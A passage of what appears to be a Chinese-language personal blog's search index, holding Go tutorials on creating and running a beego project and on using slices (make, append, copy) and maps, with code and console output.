class="keyword">go</span>/src/beeg/conf</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/controllers</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/tests</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/conf/app.conf</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/models</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/routers/</span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/controllers/object.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/controllers/user.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/tests/default_test.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/routers/router.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/models/object.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/models/user.<span class="keyword">go</span></span><br><span class="line">create /Users/fun/<span class="keyword">go</span>/src/beeg/main.<span class="keyword">go</span></span><br><span class="line"><span class="number">2018</span>/<span class="number">10</span>/<span class="number">31</span> <span class="number">23</span>:<span class="number">46</span>:<span class="number">46</span> SUCCESS  ▶ <span class="number">0002</span> New API successfully created!</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├── conf</span><br><span class="line">│   └── app.conf</span><br><span class="line">├── controllers</span><br><span class="line">│   ├── default.go</span><br><span class="line">│   ├── object.go</span><br><span class="line">│   └── user.go</span><br><span class="line">├── main.go</span><br><span class="line">├── models</span><br><span class="line">│   ├── object.go</span><br><span class="line">│   └── user.go</span><br><span class="line">├── routers</span><br><span class="line">│   └── router.go</span><br><span class="line">├── static</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── img</span><br><span class="line">│   └── js</span><br><span class="line">│       └── reload.min.js</span><br><span class="line">├── tests</span><br><span class="line">│   └── default_test.go</span><br><span class="line">└── views</span><br><span class="line">    └── index.tpl</span><br></pre></td></tr></table></figure></div><h3 id="run命令"><a href="#run命令" class="headerlink" title="run命令"></a>run命令</h3><h4 id><a href="#" class="headerlink" title></a><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><figcaption><span>run```命令是监控beego的项目，但是需要注意的是一定需要在自己创建的目录下才可以运行哦。  </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">```go</span><br><span class="line">$ bee run</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.10.0</span><br><span class="line">2018/10/31 23:49:08 INFO     ▶ 0001 Using &apos;beeg&apos; as &apos;appname&apos;</span><br><span class="line">2018/10/31 23:49:08 INFO     ▶ 0002 Initializing watcher...</span><br><span class="line">beeg/models</span><br><span class="line">beeg/controllers</span><br><span class="line">beeg/routers</span><br><span class="line">beeg</span><br><span class="line">2018/10/31 23:49:11 SUCCESS  ▶ 0003 Built Successfully!</span><br><span class="line">2018/10/31 23:49:11 INFO     ▶ 0004 Restarting &apos;beeg&apos;...</span><br><span class="line">2018/10/31 23:49:11 SUCCESS  ▶ 0005 &apos;./beeg&apos; is running...</span><br><span class="line">2018/10/31 23:49:11.600 [I] [parser.go:112]  generate router from comments</span><br><span class="line">2018/10/31 23:49:11.601 [I] [router.go:269]  /Users/fun/go/src/beeg/controllers no changed</span><br><span class="line">2018/10/31 23:49:11.609 [I] [asm_amd64.s:1333]  http server Running on http://:8080</span><br></pre></td></tr></table></figure></div></h4><h4 id="打开浏览器访问htttp-127-0-0-1-8080就可以看到内容啦。"><a href="#打开浏览器访问htttp-127-0-0-1-8080就可以看到内容啦。" class="headerlink" title="打开浏览器访问htttp://127.0.0.1:8080就可以看到内容啦。"></a>打开浏览器访问<code>htttp://127.0.0.1:8080</code>就可以看到内容啦。</h4>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言编程</title>
      <link href="/2018/10/30/go-yu-yan-bian-cheng/"/>
      <url>/2018/10/30/go-yu-yan-bian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Go语言编程"><a href="#Go语言编程" class="headerlink" title="Go语言编程"></a>Go语言编程</h1><h2 id="1-0数组切片"><a href="#1-0数组切片" class="headerlink" title="1.0数组切片"></a>1.0数组切片</h2><h3 id="1-1基于数组"><a href="#1-1基于数组" class="headerlink" title="1.1基于数组"></a>1.1基于数组</h3><p>基于数组我们很好理解，先创建数组再创建切片。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> firstarry [<span class="number">10</span>]<span class="keyword">int</span> = [<span class="number">10</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;</span><br><span class="line"><span class="comment">// 创建一个数组</span></span><br><span class="line"><span class="keyword">var</span> secendarry []<span class="keyword">int</span> = firstarry[:<span class="number">5</span>]</span><br><span class="line"><span class="comment">// 创建一个切片数组</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"This is fist arry :"</span>)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> firstarry &#123;</span><br><span class="line">fmt.Print(v,<span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"\nThis is second arry :"</span>)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> secendarry &#123;</span><br><span class="line">fmt.Print(v,<span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go run slice.go</span><br><span class="line">This is fist arry :</span><br><span class="line">1 2 3 4 5 6 7 8 0 0</span><br><span class="line">This is second arry :</span><br><span class="line">1 2 3 4 5</span><br></pre></td></tr></table></figure></div><p>可以看出和python很相似，可以更具自己需要的位置选取，array[start:finall]。  </p><h3 id="1-2直接创建"><a href="#1-2直接创建" class="headerlink" title="1.2直接创建"></a>1.2直接创建</h3><p>Go内置函数make()可以直接创建数组切片。<br>创建初始元素个数为5的数组切片   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myslice := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure></div><p> 创建一个初始元素个数为5且预留了10个元素的储存空间</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myslice := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure></div><p>直接创建一个初始化元素为5的数组切片</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myslice := []<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myslice := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line">fmt.Println(<span class="string">"myslice len:"</span>,<span class="built_in">len</span>(myslice))</span><br><span class="line">fmt.Println(<span class="string">"myslice cap:"</span>,<span class="built_in">cap</span>(myslice))</span><br><span class="line">  <span class="comment">// myslice := []int&#123;1, 2, 3, 4, 5, 6&#125;</span></span><br><span class="line"><span class="comment">// fmt.Println("myslice len:", len(myslice))</span></span><br><span class="line"><span class="comment">// fmt.Println("myslice cap:", cap(myslice))</span></span><br><span class="line"><span class="comment">//myslice := make([]int, 5)</span></span><br><span class="line"><span class="comment">//fmt.Println("myslice len:", len(myslice))</span></span><br><span class="line"><span class="comment">//fmt.Println("myslice cap:", cap(myslice))</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run slice1.<span class="keyword">go</span></span><br><span class="line">myslice <span class="built_in">len</span>: <span class="number">5</span></span><br><span class="line">myslice <span class="built_in">cap</span>: <span class="number">10</span>  </span><br><span class="line"></span><br><span class="line">myslice <span class="built_in">len</span>: <span class="number">6</span></span><br><span class="line">myslice <span class="built_in">cap</span>: <span class="number">6</span>  </span><br><span class="line"></span><br><span class="line">myslice <span class="built_in">len</span>: <span class="number">5</span></span><br><span class="line">myslice <span class="built_in">cap</span>: <span class="number">5</span></span><br></pre></td></tr></table></figure></div><h3 id="1-3动态增减元素"><a href="#1-3动态增减元素" class="headerlink" title="1.3动态增减元素"></a>1.3动态增减元素</h3><p>我们可以利用append()对数组切片进行新增元素。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myslice := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">5</span>)</span><br><span class="line">fmt.Println(<span class="string">"myslice len:"</span>, <span class="built_in">len</span>(myslice))</span><br><span class="line">fmt.Println(<span class="string">"myslice cap:"</span>, <span class="built_in">cap</span>(myslice))</span><br><span class="line">newslice := <span class="built_in">append</span>(myslice, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> newslice &#123;</span><br><span class="line">fmt.Print(v, <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">"\nnewslice len:"</span>, <span class="built_in">len</span>(newslice))</span><br><span class="line">fmt.Println(<span class="string">"newslice cap:"</span>, <span class="built_in">cap</span>(newslice))</span><br><span class="line"></span><br><span class="line">myslice2 := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>,<span class="number">10</span>)</span><br><span class="line"><span class="comment">// fmt.Println("myslice2 len:",len(myslice))</span></span><br><span class="line"><span class="comment">// fmt.Println("myslice2 cap:",cap(myslice))</span></span><br><span class="line">myslice3 := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">// fmt.Println("myslice3 len:", len(myslice))</span></span><br><span class="line"><span class="comment">// fmt.Println("myslice3 cap:", cap(myslice))</span></span><br><span class="line">myslice4 := <span class="built_in">append</span>(myslice2,myslice3...)</span><br><span class="line">fmt.Println(<span class="string">"\nmyslice4 len:"</span>,<span class="built_in">len</span>(myslice4))</span><br><span class="line">fmt.Println(<span class="string">"myslice4 cap:"</span>,<span class="built_in">len</span>(myslice4))</span><br><span class="line"><span class="keyword">for</span> _, x := <span class="keyword">range</span> myslice4 &#123;</span><br><span class="line">fmt.Print(x,<span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run <span class="built_in">append</span>.<span class="keyword">go</span></span><br><span class="line">myslice <span class="built_in">len</span>: <span class="number">5</span></span><br><span class="line">myslice <span class="built_in">cap</span>: <span class="number">5</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line">newslice <span class="built_in">len</span>: <span class="number">9</span></span><br><span class="line">newslice <span class="built_in">cap</span>: <span class="number">10</span></span><br><span class="line"></span><br><span class="line">myslice4 <span class="built_in">len</span>: <span class="number">11</span></span><br><span class="line">myslice4 <span class="built_in">cap</span>: <span class="number">11</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br></pre></td></tr></table></figure></div><p>利用append（）将会在原数组后面新增元素。原数组长度为5，新增了1，2，3，4所以长度变成了9。两个数组append在一起时，一定不能缺少那个省略号，否则会编译失败。</p><h3 id="1-4基于数组切片创建数组切片"><a href="#1-4基于数组切片创建数组切片" class="headerlink" title="1.4基于数组切片创建数组切片"></a>1.4基于数组切片创建数组切片</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">oldslice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">newslice := oldslice[:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> newslice &#123;</span><br><span class="line">fmt.Print(v, <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run slice2.<span class="keyword">go</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure></div><h3 id="内容复制"><a href="#内容复制" class="headerlink" title="内容复制"></a>内容复制</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">slice1 := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">slice2 := []<span class="keyword">int</span>&#123;<span class="number">5</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">copy</span>(slice1, slice2)</span><br><span class="line">fmt.Println(<span class="string">"slice1:"</span>)</span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> slice1 &#123;</span><br><span class="line">fmt.Print(v, <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// copy(slice2, slice1)</span></span><br><span class="line"><span class="comment">// fmt.Println("\nslice2:")</span></span><br><span class="line"><span class="comment">// for _, x := range slice2 &#123;</span></span><br><span class="line"><span class="comment">// fmt.Print(x, " ")</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run <span class="built_in">copy</span>.<span class="keyword">go</span></span><br><span class="line">slice1:</span><br><span class="line"><span class="number">5</span> <span class="number">4</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line">把<span class="built_in">copy</span>(slice1,slice2)一下内容注释后</span><br><span class="line">slice2:</span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure></div><h5 id="我们可以看出，copy不会改变array的大小。"><a href="#我们可以看出，copy不会改变array的大小。" class="headerlink" title="我们可以看出，copy不会改变array的大小。"></a>我们可以看出，copy不会改变array的大小。</h5><h2 id="2-0-map"><a href="#2-0-map" class="headerlink" title="2.0 map"></a>2.0 map</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PersonInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">ID      <span class="keyword">string</span></span><br><span class="line">Name    <span class="keyword">string</span></span><br><span class="line">Address <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> PersonInfoDB <span class="keyword">map</span>[<span class="keyword">string</span>]PersonInfo</span><br><span class="line">PersonInfoDB = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]PersonInfo)</span><br><span class="line">PersonInfoDB[<span class="string">"1234"</span>] = PersonInfo&#123;<span class="string">"1234"</span>, <span class="string">"FUN"</span>, <span class="string">"shanghai"</span>&#125;</span><br><span class="line">PersonInfoDB[<span class="string">"12"</span>] = PersonInfo&#123;<span class="string">"12"</span>, <span class="string">"kali"</span>, <span class="string">"shanghai"</span>&#125;</span><br><span class="line">person, ok := PersonInfoDB[<span class="string">"1234"</span>]</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">fmt.Println(<span class="string">"Find person"</span>, person.ID,person.Name,person.Address)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"Not Found"</span>, person.Name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> run <span class="keyword">map</span>.<span class="keyword">go</span></span><br><span class="line">Find person <span class="number">1234</span> FUN shanghai</span><br></pre></td></tr></table></figure></div><h4 id="2-1声明变量"><a href="#2-1声明变量" class="headerlink" title="2.1声明变量"></a>2.1声明变量</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> PersonInfoDB <span class="keyword">map</span>[<span class="keyword">string</span>]PersonInfo</span><br></pre></td></tr></table></figure></div><p>PersonInfoDB为我们声明的map变量名，[string]则为键的类型，PersonInfo则为所以存放值得类型。  </p><h4 id="2-2-创建"><a href="#2-2-创建" class="headerlink" title="2.2 创建"></a>2.2 创建</h4><p> 创建map可以使用make函数。下面创建了一个键为string类型，值类型为PersonInfo的map。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PersonInfoDB = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]PersonInfo)</span><br></pre></td></tr></table></figure></div><h5 id="我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。"><a href="#我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。" class="headerlink" title="我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。"></a>我们还能在创建时定义map初始的存储能力。以下为粗存能力为100的map。</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PersonInfoDB = make(map[string]PersonInfo,100)</span><br></pre></td></tr></table></figure></div><p> 还能创建直接储存值。  </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PersonInfoDB = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]PersonInfo&#123;<span class="string">"1234"</span>, <span class="string">"FUN"</span>, <span class="string">"shanghai"</span>&#125;)</span><br></pre></td></tr></table></figure></div><h4 id="2-3赋值"><a href="#2-3赋值" class="headerlink" title="2.3赋值"></a>2.3赋值</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PersonInfoDB[<span class="string">"1234"</span>] = PersonInfo&#123;<span class="string">"1234"</span>, <span class="string">"FUN"</span>, <span class="string">"shanghai"</span>&#125;</span><br></pre></td></tr></table></figure></div><h4 id="2-4元素删除"><a href="#2-4元素删除" class="headerlink" title="2.4元素删除"></a>2.4元素删除</h4><p>利用到delete函数</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">delete</span>(PersonInfoDB,<span class="string">"1234"</span> )</span><br></pre></td></tr></table></figure></div><h4 id="2-5元素查找"><a href="#2-5元素查找" class="headerlink" title="2.5元素查找"></a>2.5元素查找</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">person, 